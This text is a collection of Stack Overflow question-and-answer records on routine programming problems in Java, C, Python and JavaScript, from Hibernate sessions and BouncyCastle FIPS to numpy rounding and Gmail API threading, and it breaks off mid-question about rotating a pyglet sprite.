Model subProcessModel = getModelByModelGroup(1112);
System.out.println(subProcessModel.getElement().getNote());

I implemented the getModelByModelGroup(int modelgroupid) method firstly like this :
public static Model getModelByModelGroup(int modelGroupId, boolean openTransaction) {

    Session session = SessionFactoryHelper.getSessionFactory().getCurrentSession();     
    Transaction tx = null;

    if (openTransaction) {
        tx = session.getTransaction();
    }

    String responseMessage = """";

    try {
        if (openTransaction) {
            tx.begin();
        }
        Query query = session.createQuery(""from Model where modelGroup.id = :modelGroupId"");
        query.setParameter(""modelGroupId"", modelGroupId);

        List<Model> modelList = (List<Model>)query.list(); 
        Model model = null;

        for (Model m : modelList) {
            if (m.getModelType().getId() == 3) {
                model = m;
                break;
            }
        }

        if (model == null) {
            Object[] arrModels = modelList.toArray();
            if (arrModels.length == 0) {
                throw new Exception(""Non esiste "");
            }

            model = (Model)arrModels[0];
        }

        if (openTransaction) {
            tx.commit();
        }

        return model;

   } catch(Exception ex) {
       if (openTransaction) {
           tx.rollback();
       }
       ex.printStackTrace();
       if (responseMessage.compareTo("""") == 0) {
           responseMessage = ""Error"" + ex.getMessage();
       }
       return null;
    }
}

and got the exception. Then a friend suggested me to always test the session and get the current session to avoid this error. So I did this:
public static Model getModelByModelGroup(int modelGroupId) {
    Session session = null;
    boolean openSession = session == null;
    Transaction tx = null;
    if (openSession) {
        session = SessionFactoryHelper.getSessionFactory().getCurrentSession(); 
        tx = session.getTransaction();
    }
    String responseMessage = """";

    try {
        if (openSession) {
            tx.begin();
        }
        Query query = session.createQuery(""from Model where modelGroup.id = :modelGroupId"");
        query.setParameter(""modelGroupId"", modelGroupId);

        List<Model> modelList = (List<Model>)query.list(); 
        Model model = null;

        for (Model m : modelList) {
            if (m.getModelType().getId() == 3) {
                model = m;
                break;
            }
        }

        if (model == null) {
            Object[] arrModels = modelList.toArray();
            if (arrModels.length == 0) {
                throw new RuntimeException(""Non esiste"");
            }

            model = (Model)arrModels[0];

            if (openSession) {
                tx.commit();
            }
            return model;
        } catch(RuntimeException ex) {
            if (openSession) {
                tx.rollback();
            }
            ex.printStackTrace();
            if (responseMessage.compareTo("""") == 0) {
                responseMessage = ""Error"" + ex.getMessage();
            }
            return null;        
        }
    }
}

but still, get the same error. 
I have been reading a lot for this error and found some possible solutions. One of them was to set lazyLoad to false but I am not allowed to do this that's why I was suggested to control the session
","What is wrong here is that your session management configuration is set to close session when you commit transaction. Check if you have something like:
<property name=""current_session_context_class"">thread</property>

in your configuration.
In order to overcome this problem you could change the configuration of session factory or open another session and only then ask for those lazy loaded objects. But what I would suggest here is to initialize this lazy collection in getModelByModelGroup itself and call:
Hibernate.initialize(subProcessModel.getElement());

when you are still in active session.
And one last thing. A friendly advice. You have something like this in your method:
for (Model m : modelList) {
    if (m.getModelType().getId() == 3) {
        model = m;
        break;
    }
}

Please insted of this code just filter those models with type id equal to 3 in the query statement just couple of lines above.
Some more reading:
session factory configuration
problem with closed session
",java
are all elements of the dirent structure open to use,"I am currently working on the implementation of my own ""ls"" command. I've been relying on the structure but I found an old post stating that some members of this structure such as d_type shouldn't be used.
I have already been able to list the files in the repository but I want to sort the files depending of their type hence the reason of my post.
So I am just wondering if there is a way other than using the d_type or if it is not actually wrong to use it.
","If your question is about Ubuntu, that is Linux/glibc, described in detail by the readdir man page. Its dirent does have the d_type field. But keep in mind that it may give you DT_UNKNOWN at any time and you should be able to deal with it.
The most portable (POSIX) way to code this would be not to rely on d_type at all as POSIX only mandates the d_name and d_ino fields.
So what to do if you either don't have the d_type field or it has given you an unknown value? Use one of the stat functions (for listing files probably lstat to not follow links) and then for glibc you can follow Testing the Type of a File on the st_mode field in the result of stat.
",c
c compiler preprocessor output,"C compilers supports generating the preprocessor output file with .i extension.
As far as I know, this is true for Microsoft (Visual Studio), ARM, Keil and some GNU compilers.
They usually use the compiler switch -E or -P for that.
There's also the compiler switch -C to retain comments.
Is the creation of preprocessor files a standard in ANSI-C, or is this compiler specific?
Is the option -C also a standard?
EDIT:
To be more precise: This is about the support for creation of the .i file, not the compiler switch syntax or names.
","It is not standardized in the ISO C standard.
However most compilers seem to have -E for generating prepro output. This is reasonable as the prepro output is often very useful for debugging.
Here is a list of compilers I checked:

gcc
pcc
clang
ctc (TriCore)
Tasking C166
Wind River (DIAB)

All these compilers allow writing the prepro output to any file (with any extension). The .i is definitely not standard.
The option -C for retaining comments seems to be rather specific.
",c
modulenotfounderror no module named 39torch39 but torch is installed,"I'm trying to use (and have successfully installed) Layout Parser, which requires detectron2 for certain functionality. While trying to install detectron2, I ran into the following error:
> python -m pip install 'git+https://github.com/facebookresearch/detectron2.git'

[snip]
      ModuleNotFoundError: No module named 'torch'
      [end of output]
[/snip]

Setting the flags as specified in the installation instructions does nothing:
CC=clang CXX=clang++ ARCHFLAGS=""-arch x86_64"" pip3 install 'git+https://github.com/facebookresearch/detectron2.git@v0.4#egg=detectron2'

[same output]


I have torch (2.4.1) and torchvision (0.19.1) installed, and the versions match.
I'm on macOS Sequoia 15.1.1
I'm using Python 3.10.14 and pip 24.2

Full output of the installation command is at this pastebin.
","Modern pip uses build isolation, it uses a transient virtual env to build a wheel. For packages that don't require build dependencies or packages that declare build dependencies in pyproject.toml it's not a problem. But the package detectron2 requires torch and doesn't provide pyproject.toml.
You can downgrade to older pip version 22 that doesn't build in an isolated environment. Or disable build isolation using --no-build-isolation. The full command should be
python -m pip install --no-build-isolation 'git+https://github.com/facebookresearch/detectron2.git'

",python
how to selectively use approvedonly mode with bouncycastle jsse provider  fips provider,"In a small piece of sample code running on Java 8, I'm trying to follow the advice from the bc-fips-1.0.2.jar user guide, Legion of the Bouncy Castle Inc. BC-FJA 1.0.2 (Bouncy Castle FIPS Java API) User Guide Date: 09/14/19:

Note: support for FIPS mode appears to have started disappearing with
Java 1.9, it has been confirmed that it is a null operation as of Java
11. For Java 11, or later, we recommend using the BCJSSE provider if you need FIPS support.

(footnote on page 11).  And I'm doing this in a 'mixed' context, so most threads run in default mode, and some run in FIPS approved-only mode.
However, that doesn't seem to work: It seems an 'approved' thread is trying to reuse and instance created by an 'unapproved' thread.
Specifically, when programmatically enabling bc-fips-1.0.2.jar's BCFIPS and bctls-fips-1.0.10.jar's BCJSSE, on a standard unmodified OpenJDK 8 (Corretto 8u232 in my case), and programmatically removing the built-in SunJSSE provider, then doing an HTTPS connection on a new thread in unapproved mode, then on another new thread in approved mode, results in an exception:
Caused by: org.bouncycastle.crypto.fips.FipsUnapprovedOperationError: Attempt to use unapproved implementation in approved thread: SHA-512
    at org.bouncycastle.crypto.internal.io.Utils.approvedModeCheck(Unknown Source)
    at org.bouncycastle.crypto.internal.io.DigestOutputStream.write(Unknown Source)
    at org.bouncycastle.crypto.UpdateOutputStream.update(Unknown Source)
    at org.bouncycastle.jcajce.provider.BaseMessageDigest.engineUpdate(Unknown Source)
    at java.security.MessageDigest.update(MessageDigest.java:335)
    at org.bouncycastle.tls.crypto.impl.jcajce.JcaTlsCryptoProvider$NonceEntropySource$NonceEntropySourceSpi.runDigest(Unknown Source)
    at org.bouncycastle.tls.crypto.impl.jcajce.JcaTlsCryptoProvider$NonceEntropySource$NonceEntropySourceSpi.engineNextBytes(Unknown Source)
    at java.security.SecureRandom.nextBytes(SecureRandom.java:468)
    at org.bouncycastle.tls.crypto.impl.jcajce.JcaNonceGenerator.<init>(Unknown Source)
    at org.bouncycastle.tls.crypto.impl.jcajce.JcaTlsCrypto.createNonceGenerator(Unknown Source)
    at org.bouncycastle.tls.AbstractTlsContext.createNonceGenerator(Unknown Source)
    at org.bouncycastle.tls.AbstractTlsContext.<init>(Unknown Source)
    at org.bouncycastle.tls.TlsClientContextImpl.<init>(Unknown Source)
[etc]

Full reproduction scenario of my attempts is at https://gist.github.com/marnix/834610d0fb92e53ce507edfce96bacb9, see the class's javadoc for details.
So my question is: How do I make HTTPS connections work, where some are in the default mode and others are in FIPS approved-only mode, using BCJSSE instead of SunJSSE?
Or will this not work on Java 8, and do I have to wait for Java 9+ for this to start working?  (Why?)
(My ultimate goal is not for HTTPS connections but for other things, where most will run in the default mode, and some threads will run in approved-only mode.)
","Using separate SSLContext instances is the right approach, but using SSLContext.setDefault is very wrong here. Partly because once you remove the thread joins, there will be race conditions b/w the setters. More importantly though, HttpsURLConnection only sets its default SSLSocketFactory once, and will call SSLContext.getDefault at most once to set it, so calling SSLContext.setDefault after that will have no effect on HttpsURLConnection, and you will get sharing of the original SSLContext and FIPS errors.
Remove:
SSLContext.setDefault(context);

and replace:
url.openConnection()

with:
HttpsURLConnection conn = (HttpsURLConnection)url.openConnection();
conn.setSSLSocketFactory(context.getSocketFactory());

",java
how to create a file in memory for user to download but not through server,"Is there a way to create a text file on the client side and prompt the user to download it without any interaction with the server?
I know I can't write directly to their machine (security and all), but can I create the file and prompt them to save it?
","You can use data URIs.  Browser support varies; see Wikipedia.  Example:
<a href=""data:application/octet-stream;charset=utf-16le;base64,//5mAG8AbwAgAGIAYQByAAoA"">text file</a>

The octet-stream is to force a download prompt.  Otherwise, it will probably open in the browser.
For CSV, you can use:
<a href=""data:application/octet-stream,field1%2Cfield2%0Afoo%2Cbar%0Agoo%2Cgai%0A"">CSV Octet</a>

Try the jsFiddle demo.
",javascript
program to find the largest and smallest among three entered numbers and also display whether the identified largestsmallest number is even or odd,"This is my homework and i am stuck with how should i identify that the smallest/largest number is even or odd.
#include <stdio.h>
void main()
{
    int num1,num2,num3;
    printf(""Enter three numbers\n"");
    scanf(""%d %d %d"",&num1,&num2,&num3);
    if(num1<num2 && num1<num3){
        printf(""\n%d is the smallest"",num1);
    }
    else if(num2<num3){
        printf(""\n%d is the smallest"",num2);
    }
    else{
        printf(""\n%d is the smallest"",num3);
    }
    if(num1>num2 && num1>num3){
        printf(""\n%d is largest"",num1);
    }
    else if(num2>num3){
        printf(""\n%d is largest"",num2);
    }
    else{
        printf(""\n%d is largest"",num3);
    }
    getch();
    return 0;
}

","Use 2 variables, one to store the smallest, one to store the largest.
int min, max;

Then, assign the variable :
if (num1 < num2)
    min = num1;
if (num3 < min)
    min = num3;
printf(""%d is the largest number"", min);

To know if a number is odd or even, the remainder (also called modulo) of its division by 2 will be 0 (for even) or 1 (for odd) :
int modulo = min % 2;
if (modulo == 0)
    printf(""%d is even"", min);
else
    printf(""%d is odd"", min);

",c
how to install graphviz238 on windows 10,"I know this is basic, but I'm pretty stuck. I've never installed python packages on Windows OS before... only Linux.
I downloaded the graphviz-2.38 zip and moved it to my Anaconda packages directory. I unzipped it, and then on the command line tried: 
C:\Users\name\Anaconda3\pkgs\graphviz-2.38> pip install graphviz-2.38

This is the error I got:
Could not find a version that satisfies the requirement graphviz-2.38 (from 
versions: )
No matching distribution found for graphviz-2.38

I don't see any setup file within graphviz at all, so I'm a little lost. 
","Just use:
pip install graphviz

",python
spring boot command line run not using logbackspringxml,"This app works fine in IntelliJ and creates the log files as per configurations, however when launched the app from command line its not using logback-spring.xml file and instead goes on to create *tmp/spring.log file which seems to coming from spring *logback/base.xml.
I have spent couple of days to troubleshoot this issue but nothing seems to work so far and other questions do not address the underlying issue, your help is appreciated.
I am launching the app as -
java -jar abc.jar -Dspring.profiles.active=test

I can see that logback-spring.xml is present inside abc.jar as
BOOT-INF/classes/ logback-spring.xml
","Here you can find how to configure logback with spring-boot howto.logging.logback
With src/main/resources/logback-spring.xml
<?xml version=""1.0"" encoding=""UTF-8""?>
<configuration>
    <include resource=""org/springframework/boot/logging/logback/defaults.xml""/>
    <include resource=""org/springframework/boot/logging/logback/console-appender.xml"" />

    <!-- include spring boot file-appender -->
    <include resource=""org/springframework/boot/logging/logback/file-appender.xml"" />

    <root level=""INFO"">
        <appender-ref ref=""CONSOLE"" />
        <appender-ref ref=""FILE"" /> <!-- add file-appender -->
    </root>
    <logger name=""com.example"" level=""DEBUG""/>
</configuration>

And providing a logging file-name in src/main/resources/application.properties
logging.file.name=application.log

You should see a file application.log in the same directory as you launched your application with
java -jar your-app.jar --spring.profiles.active=test
",java
how can i create a new char array in a for loop in c,"I am trying to create a new char array each time the loop is ran, but for some reason the char array is shared between every execution of the loop, and when I try to print it, it prints the last assigned value in the loop.
How can I avoid this without using heap functions like malloc?
#include <stdio.h>

typedef struct {
    char* text;
} t_page;

typedef struct {
    t_page* pages;
    char* title;
} t_book;

t_page new_page(char* text) {
    t_page page = {text};
    return page;
}

t_book new_book(t_page pages[], char* title) {
    t_book book = {pages, title};
    return book;
}

int main() {
    t_page pages[10];
        
    for (int i = 0; i < 10; i++) {
        char text[2]; // I want to create a brand new char array here
        sprintf(text, ""%d"", i);
        
        pages[i] = new_page(text);
    }
   
    t_book book = new_book(pages, ""my book"");
    printf(""%s\n"", book.pages[0].text); // prints '9' instead of '0'
    
    return 0;
}

Note: I am new in C, I am not reading any manual or tutorials. Just messing around for fun.
I was expecting the for loop to create a new char every time it was executed, but it only shared the same address and last assigned value. I was expecting for it to be separately created every time it was ran.
","Using a routine from the malloc family is the only reasonable solution to creating persistent objects in C in a for loop.
C has four storage durations: static, thread, automatic, and allocated.
The lifetimes of static objects start when program execution starts and end when program execution ends. You cannot create new static objects in a loop because they cannot be created during program execution, only at its start.
The lifetimes of thread objects start when a thread starts and end when the thread ends. You cannot create new thread objects in a loop except by creating new threads.
The lifetimes of automatic objects are associated with the block in which they are defined (except special temporary objects have even shorter lifetimes). The body of a for loop is a block, so an automatic object cannot persist after each execution of the for loop body ends. (Each iteration is a separate execution of the body.)
That leaves only allocated storage duration. This is the only choice for creating persistent objects inside a for loop, so you must use malloc or a related routine. (Technically, you could create multiple threads, but, as far as memory allocation goes, this effectively the same as creating objects with malloc except it is much more wasteful and will require some gymnastics to make the thread objects usable.)
",c
sending a reply with gmail api python,"I created two Gmail accounts and I'm trying to create an e-mail thread between them with the Python Gmail API.
I can send e-mails without any issue, but when it comes to replying to each other and creating a thread, it is simply not working : the new message is successfully displaying as the answer of the received email for the sender, but it is appearing as a new message - without a linked thread - for the receiver.
This problem was described here in 2019 : https://stackoverflow.com/a/63186609/21966625
However, the Gmail APIs changed a lot since this article and I didn't find how to use these advices with today's API.
I tried to carefully respect the instructions of the docs by defining the message's parameters References and In-Reply-To as the received message's id when replying.
Indeed, I retrieve the email :
received_email= service.users().messages().get(userId='me', id=label['id']).execute()

I get a dict looking like:
{'id': '189462395f418017', 'threadId': '189462395f418017', 'labelIds': ['UNREAD','INBOX'], 'snippet': 'xxx'....}

Hence, when I'm building my e-mail, the following method should work :
message_id=received_email['id']

message = EmailMessage()
message.set_content('')
message['To'] = 'john.doe@gmail.com'
message['From'] = 'john.doe@gmail.com'
message['References'] = message_id
message['In-Reply-To'] = message_id
message['Subject'] = 'Automated draft'

In the same way, I defined the threadId as the id of the message I wanted to reply to.
create_message = {'raw': encoded_message,
                  'threadId': message_id
                 }
send_message = (service.users().messages().send(userId=""me"", body=create_message).execute())

Thanks to this part of the code, the answers are correctly displayed (for the sender of the answer) as explained above, but it appears as a new message - unlinked to a thread - for the receiver.
","Actually I found why my method did not work ; even if the dict mention a kind of message id :
email = {'id': '189462395f418017', 'threadId': '189462395f418017', 'labelIds': ['UNREAD','INBOX'], 'snippet': 'xxx'....}

I thought the messageIDcould be taken just by call email['id'].
The real messageID is somewhere in the ['payload']['headers'] dictionnary ; one could find it by a loop like :
for p in email['payload']['headers']:
    if p[""name""] == ""Message-Id"":
        message_id = p['value']

This way we have the true messageID of the email, and the threads are successfully created.
",python
floor and ceil with number of decimals,"I need to floor a float number with an specific number of decimals.
So:
2.1235 with 2 decimals --> 2.12
2.1276 with 2 decimals --> 2.12  (round would give 2.13 which is not what I need)

The function np.round accepts a decimals parameter but it appears that the functions ceil and floor don't accept a number of decimals and always return  a number with zero decimals.
Of course I can multiply the number by 10^ndecimals, then apply floor and finally divide by 10^ndecimals
new_value = np.floor(old_value * 10**ndecimals) / 10**ndecimals

But I'm wondering if there's a built-in function that does this without having to do the operations.
","Neither Python built-in nor numpy's version of ceil/floor support precision.
One hint though is to reuse round instead of multiplication + division (should be much faster):
def my_ceil(a, precision=0):
    return np.round(a + 0.5 * 10**(-precision), precision)

def my_floor(a, precision=0):
    return np.round(a - 0.5 * 10**(-precision), precision)

UPD:
As pointed out by @aschipfl, for whole values np.round will round to the nearest even, which will lead to unexpected results, e.g. my_ceil(11) will return 12. Here is an updated solution, free of this problem:
def my_ceil(a, precision=0):
    return np.true_divide(np.ceil(a * 10**precision), 10**precision)

def my_floor(a, precision=0):
    return np.true_divide(np.floor(a * 10**precision), 10**precision)

",python
include and what actually compiles,"This is just a general compiler question, directed at C based languages.
If I have some code that looks like this:
#include ""header1.h""
#include ""header2.h""
#include ""header3.h""
#include ""header4.h""  //Header where #define BUILD_MODULE is located

#ifdef BUILD_MODULE

//module code to build

#endif //BUILD_MODULE

Will all of the code associated with those headers get built even if BUILD_MODULE is not defined? The compiler just ""pastes"" the contents of headers correct? So this would essentially build a useless bunch or header code that just takes up space?
","All of the text of the headers will be included in the compilation, but they will generally have little or no effect, as explained below.
C does not have any concept of “header code”. A compilation of the file in the question would be treated the same as if the contents of all the included files appeared in a single file. Then what matters is whether the contents define any objects or functions.
Most declarations in header files are (as header files are commonly used) just declarations, not definitions. They just tell the compiler about things; they do not actually cause objects or code to be created. For the most part, a compiler will not generate any data or code from declarations that are not definitions.
If the headers define external objects or functions, the compiler must generate data (or space) or code for them, because these objects or functions could be referred to from other source files to be compiled later and then linked with the object produced from the current compilation. (Some linkers can determine that external objects or functions are not used and discard them.)
If the headers define static objects or functions (to be precise, objects with internal or no linkage), then a compiler may generate data or code for these. However, the optimizer should see that these objects and functions are not referenced, and therefore generation may be suppressed. This is a simple optimization, because it does not require any complicated code or data analysis, simply an observation that nothing depends on the objects or functions.
So, the C standard does not guarantee that no data or code is generated for static objects or functions, but even moderate quality C implementations should avoid it, unless optimization is disabled.
",c
how to elegantly support arm assembly on both macos and android,"I am currently writing a project using c language and arm assembly directly.
And I compiled the project for Android, everything was fine.
But when I compiled the project on MacOS (with Apple silicon), it failed. And I realized that the codes compiled on MacOS will be added a prefix _ to all symbols except for ASM codes.

I previously thought only ASM codes will be added a prefix, and after I took a deep look into the compiled codes, I found out that I was wrong.

For example:
int test_func();

int main() {
    printf(""%d\n"", test_func());
    return 0;
}

.global test_func
test_func:
    mov x0, x1
    ret

When compiling this code on MacOS, the main function is actually calling to _test_func() instead of test_func().
When compiling this code for Android, the test_func symbol is still itself.
So I am wondering if there is an elegant way to support both platforms without changing too much source code.
","Sorry, I made a mistake about this problem.
The problem is, on MacOS, it will automatically add _ prefix to all function, except our own assembly code.
So when calling test_func() in the main(), it is actually calling to _test_func().

I will edit this to previous question.

Then we can keep all the function in c file unchanged, and define the assembly code like this:
#ifdef __APPLE__
#define DEFINE_FUNC(func) \
    .global _##func; \
    _##func
#define END_FUNC(...) /*_*/
#else
#define DEFINE_FUNC(func)\
    .global func;   \
    .type func,%function; \
    func
#define END_FUNC(func)\
    .size func,.-func;
#endif

DEFINE_FUNC(test_func):
    mov x0, x1
    ret
END_FUNC(test_func)

This #define macro seems good but it still failed when compiling.
Then I realized that the multi-line #define will be extended to only one line (at least does so on MacOS and Linux). And the ; is treated as comment on MacOS, so only the first line in #define will be added to the compiled object.
So the compiled object for previous example is like:
// After extended
.global _test_func; _test_func:
    mov x0, x1
    ret

// After compiled
.global _test_func
    mov, x0, x1
    ret

So there is no symbol _test_func defined at all!
Then I found another way to solve this -- using .macro instead of #define. The problem of #define is that we can't pass multi-line instruction, but .macro works fine:
.macro define_func func
    .global _\func
    _\func:
.endm

#ifdef __APPLE__
#define DEFINE_FUNC(func) define_func func
#define END_FUNC(...) /*_*/
#else
#define DEFINE_FUNC(func)\
    .global func;   \
    .type func,%function; \
    func:
#define END_FUNC(func)\
    .size func,.-func;
#endif

DEFINE_FUNC(test_func)
    mov x0, x1
    ret
END_FUNC(test_func)

So now I think I solved this problem elegantly. If there is a better way, please post your idea without any hesitation.
",c
how to enforce a header file at the forefront,"Motivation:
I want to enable the memory detection of VC++, which requires that some statements must be at the forefront as follows:
#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>

Question:
Suppose I have a header file forefront.h, what I want is the following effect:
a.cpp
#include <any_other_one.h>
#include <forefront.h> // An compiler error generated here!

b.cpp
#include <forefront.h> // OK
#include <any_other_one.h>

How to implement?
","Create your own header file with the following contents:
#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>

Now use the Forced Includes setting in the Advanced section of the project's settings. Any file specified there will be included before all others, in the order specified.
",c
can i access dom element directly by id,"In javascript I always use document.getElementById() to access DOM elements, but recently I accidentally accessed it using id only and it worked. Example:
<input id=""element_id"" type=""text"">

and in javascript
element_id.onclick=fun;

Is it correct code? Why does it work? (in all browsers I have)
","Yes, in some browsers, the elements are available as global variables named for their ID.
Don't use this ""feature"". It's non-standard, and not universally supported.
",javascript
mustachejs splits html attibutes between whitespaces,"Mustache.js splits an HTML attribute between many HTML attributes between whitespaces. How can I keep the attribute as it is ?
The Object to render (width contains whitespaces)
cardpool = {
   width:""col-md-offset-3 col-md-6 col-sm-4""
 }

The template to use
<div class={{width}}>
</div>

The wrong result (Mustache.js splits the attributes between the whitespaces) :
<div class=""col-md-offset-3"" col-md-6="""" col-sm-4="""">
</div>

The expected result (I want to keep the whitespaces in the attribute)
<div class=""col-md-offset-3 col-md-6 col-sm-4"">
</div>

Do you have a solution to get the expected result ?
Thank you for your help.
","This isn't Mustache's fault. Your template is rendered to this:
<div class=col-md-offset-3 col-md-6 col-sm-4>
</div>

Notice the lack of any quotation marks around your class names. A browser can internally convert this to what you're seeing (I'm guessing that you are inspecting the generated data inside your browser's dev tools).
Your template should include the quotation marks around the variable if you want to group the class names into a single class attribute value:
<div class=""{{width}}"">
</div>

Mustache is (mostly) agnostic about the context in which it's used, so it doesn't know that attributes in HTML should be surrounded by quotation marks if the values contain whitespace. Hence, you need to add those yourself.
",javascript
what is the source of this error attempting to read my local html file using nodejs,"This is all happening on my one machine -- both the server and the client machine are the same. I am learning on w3schools and have successfully completed the Node.js examples in order until this one where I am attempting to read an html file to use as content to display. The server starts correctly as seen in the console with the blinking cursor like the prior examples, however upon trying to access localhost through chrome, I get the console logged error as well as a notification in chrome with ""127.0.0.1 refused to connect.""
error:
node:_http_outgoing:949
    throw new ERR_INVALID_ARG_TYPE(
    ^

TypeError [ERR_INVALID_ARG_TYPE]: The ""chunk"" argument must be of type string or an instance of Buffer or Uint8Array. Received undefined
    at write_ (node:_http_outgoing:949:11)
    at ServerResponse.write (node:_http_outgoing:904:15)
    at ReadFileContext.callback (C:\path-to-file-omitted\demo_readfile.js:7:9)
    at FSReqCallback.readFileAfterOpen [as oncomplete] (node:fs:299:13) {
  code: 'ERR_INVALID_ARG_TYPE'
}

Node.js v22.13.0

The two files verbatim as I used them from w3schools.
demofile1.html
<html>
<body>
<h1>My Header</h1>
<p>My paragraph.</p>
</body>
</html>

demo_readfile.js
var http = require('http');
var fs = require('fs');



http.createServer(function (req, res) {
  fs.readFile('demofile1.html', function(err, data) { // read the html file
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.write(data); // write the html content to the view
    return res.end();
  });
}).listen(8080);

Using Powershell to start node.js instance with my file using 'node C:\path-to-file\filename.js', I tried running powershell as an admin. I tried doing some searches on google and stack overflow to identify this error elsewhere, and while they appeared similar, the ones I found did not apply directly to my issue as far as I know, nor did they at least give me a resolution.
","The code you've provided is indeed correct. The problem is that you use absolute paths which is confusing for the filesystem module. 
To avoid errors like this, you can move your HTML file and JS scripts to one directory and run them using node demo_readfile.js instead of node C:\something\demo_readfile.js. Even better thing to do is use a filesystem path utility module, like this:
const http = require(""http"");
const path = require(""path"");
const fs = require(""fs"");

http.createServer(function (req, res) {

  fs.readFile(path.join(__dirname, ""demofile1.html""), function(err, data) {

    res.writeHead(200, {'Content-Type': 'text/html'});
    res.write(data);
    return res.end();

  });

}).listen(8080);

The above code utilizes path.join() to ensure that fs.readFile() always navigates to the correct path, no matter from where the script is called (which is useful when working with larger projects, eg. when the helper function file is located elsewhere than the index).
",javascript
run java class from cmd with full path,"I have compile a java file
javac XSDValidator.java

And I get a XSDValidator.class
Lets say I have the the class (XSDValidatorc.class) file in
C:\xampp\htdocs\xsd_validtion

And I write this in cmd
C:\xampp\htdocs\xsd_validtion> java XSDValidator students.xsd students.xml

It works fine. But its not working if I I'am in another directory and want to run the file with absolute path. Why doesn't it work?
Lite this, lets say I'am in the directory 
C:\aaa\User\Document

And write like this it's not working.
java C:\xampp\htdocs\xsd_validtion\XSDValidator C:\xampp\htdocs\xsd_validtion\students.xsd C:\xampp\htdocs\xsd_validtion\students.xml

This is the java-file
https://www.tutorialspoint.com/xsd/xsd_validation.htm
import java.io.File;
import java.io.IOException;

import javax.xml.XMLConstants;
import javax.xml.transform.stream.StreamSource;

import javax.xml.validation.Schema;
import javax.xml.validation.SchemaFactory;
import javax.xml.validation.Validator;

import org.xml.sax.SAXException;

public class XSDValidator {
   public static void main(String[] args) {
      if(args.length !=2){
         System.out.println(""Usage : XSDValidator <file-name.xsd> <file-name.xml>"" );
      } else {
         boolean isValid = validateXMLSchema(args[0],args[1]);

         if(isValid){
            System.out.println(args[1] + "" is valid against "" + args[0]);
         } else {
            System.out.println(args[1] + "" is not valid against "" + args[0]);
         }
      }
   }

   public static boolean validateXMLSchema(String xsdPath, String xmlPath){
      try {
         SchemaFactory factory =
            SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
            Schema schema = factory.newSchema(new File(xsdPath));
            Validator validator = schema.newValidator();
            validator.validate(new StreamSource(new File(xmlPath)));
      } catch (IOException e){
         System.out.println(""Exception: ""+e.getMessage());
         return false;
      }catch(SAXException e1){
         System.out.println(""SAX Exception: ""+e1.getMessage());
         return false;
      }

      return true;

   }
}

","use the java classpath:
java -cp C:\xampp\htdocs\xsd_validtion\ XSDValidator C:\xampp\htdocs\xsd_validtion\students.xsd C:\xampp\htdocs\xsd_validtion\students.xml

This includes the directory where the class file is located to the classpath.
directories in java are package structures. Thats why you can not use it as a normal Path
",java
nic buffer in raw socket,"I'm new in raw socket
We know that if we using raw socket we need to handle everything including the buffer
if we use raw socket we can use the following call :
recvfrom();
recvmsg();

Suppose I'm using the recvfrom() call
recvfrom(sockfd,buffer,sizeof(buffer),&sock_addr,&size_sock_addr)


When the data comes from the network it will be placed in the Nic buffer.
My question is :
(1). Does when we call the recv,recvfrom, recvmsg basically we copying data from the Nic buffer to the buffer in the main memory?
(2). I will use Example :
buffer[3000];
recvfrom(sockfd,buffer,sizeof(buffer),&sock_addr,&size_sock_addr);


Suppose my Nic card using the ring buffer design and my Nic card ring buffer size is 3000 byte and i'm receive a 2 packet and each packet have a size 1500 byte.
I will use array representation to represent the ring buffer:
Ring_Buffer[2] = {packet_1,packet_2};

we called the recvfrom,recvmsg that mean we trying to read from the Nic to the buffer in the ram.
We called recvfrom() and now we will placed the packet_1 into the buffer and now the read pointer Will be move to the next index so whenever we invoke the recvfrom again we basically placed the packet_2 into the buffer
So does when we using recvfrom or recvmsg does it will make read pointer in the ring buffer is moved?
","In common operating systems the OS kernel will read from the NIC, process the data and put it into the sockets receive buffer. The application will then read from this receive buffer with recv/recvmsg/recvfrom.
",c
modify cas overlay 713 to add custom restcontroller,"I am new to CAS codebase.
Would really appreciate some pointers?
Initialized cas overlay project from https://apereo.github.io/cas/development/installation/WAR-Overlay-Initializr.html
I am trying to add my own own class with annotation @SpringBootApplication
https://github.com/apereo/cas-overlay-template/tree/master/src/main so that it scans my packages for bean initialization and Controller class so that i can override functions of cas overlay.
https://github.com/apereo/cas-overlay-template/tree/master/src/main
I modified main entry class here https://github.com/apereo/cas-overlay-template/blob/master/gradle/springboot.gradle#L81
I can see this in the logs
2025-01-18 08:48:11,371 DEBUG [org.springframework.boot.devtools.restart.Restarter] - <Starting application com.test.AuthenticationApplication with URLs [file:/Users/Desktop/AE/ae_authentication-service/src/main/resources/, file:/Users/Desktop/AE/ae_authentication-service/build/classes/java/main/, file:/Users/Desktop/AE/ae_authentication-service/build/resources/main/]>
but why is it not scanning other packages.
Am i missing something
","The problem is that in CAS version 7, authors (AFAIK quietly) decided to disable Spring's automatic scanning/discovery of annotated components, probably for performance reasons. Instead, CAS relies on Spring's Component Indexer now. Even though it looks like all its components are still being created in Java via @Bean methods, so there should be no components scanning or indexing necessary for CAS own components anyway.
Source: CAS 7.0.0, how to scan self created beans, and manage by spring
So, the solution is either to create your component (whether it is RestController or anything else) as CAS does it, i.e. in your own Java Spring configuration class (which is documented at Extending CAS Configuration).
Or, try to put the name of your component class into the META-INF/spring.components file in your project, which you might want to automate by using the Spring indexer tools discussed in the SO page linked above. The current format of one line in that file seems to be something like org.example.YourComponentClass=org.springframework.stereotype.Component (value after the = sign might generally differ).
",java
how to properly rotate sprite on mouse left button click,"I'm developing an RTS game in Python using Pyglet library.
The sprite rotates in range from -180 to 180 degree.
The sprite can't properly rotate from -179 to 179, it rotates clockwise, all the way to 179 passing 0, instead of rotating counterclockwise and reach 179 in just 2 degrees.
 Sprite

from math import trunc, degrees, atan2
from pyglet.app import run
from pyglet.clock import schedule_interval
from pyglet.window import Window
from pyglet.graphics import Batch
from pyglet.sprite import Sprite
from pyglet.image.codecs.png import PNGImageDecoder
from pyglet.window import mouse
from pyglet.image import load
from pyglet.text import Label
from pyglet.canvas import Display


class MAIN(Window):
    def __init__(self):
        window_width = Display().get_default_screen().width // 2
        window_height = Display().get_default_screen().height // 2
        super().__init__(window_width, window_height)
        self.batch = Batch()
        self.sptiteWidth, self.spriteHeight = 100, 100
# SPRITE
        image = load('img/sprite.png', decoder=PNGImageDecoder())
